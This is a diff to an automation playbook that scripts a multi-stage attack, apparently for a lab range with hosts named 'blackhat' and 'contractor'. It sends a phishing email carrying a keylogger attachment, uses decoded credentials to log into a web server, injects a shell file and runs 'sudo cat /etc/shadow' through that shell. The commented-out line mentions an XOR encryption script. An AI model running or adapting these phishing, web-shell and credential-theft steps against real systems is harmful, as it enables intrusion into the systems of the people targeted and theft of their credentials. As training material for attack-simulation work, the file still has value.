@@ -14,6 +14,8 @@
   tasks:
     - name: send a phishing email
       raw: echo "Are you frustrated with how slow your computer is? Open the attachment for a free virus scan!" | mutt -s "Free virus scan!" -a keylogger.py -- contractor@fazio.com
+    # - name: upload xor encryption script
+    #   raw: python package.py xor.py
 - name: phishing response
   hosts: contractor
   tasks:
@@ -35,7 +37,8 @@
 - name: implement shell injection to webserver
   hosts: blackhat
   tasks:
-    - name: log in web server and inject it with shell file
-      raw: php shellinject.php logs_decoded.txt 10.0.0.16/ shell.php 'cat /etc/shadow'
-      register: out
-    - debug: var=out.stdout_lines
+    - name: log in web server using decoded username and password, inject web with shell file
+      raw: php shellinject.php logs_decoded.txt 10.0.0.16/ shell.php
+
+    - name: run shell as root on web and get credentials
+      raw: php shellrun.php logs_decoded.txt 10.0.0.16/ 'sudo+cat+%2Fetc%2Fshadow'
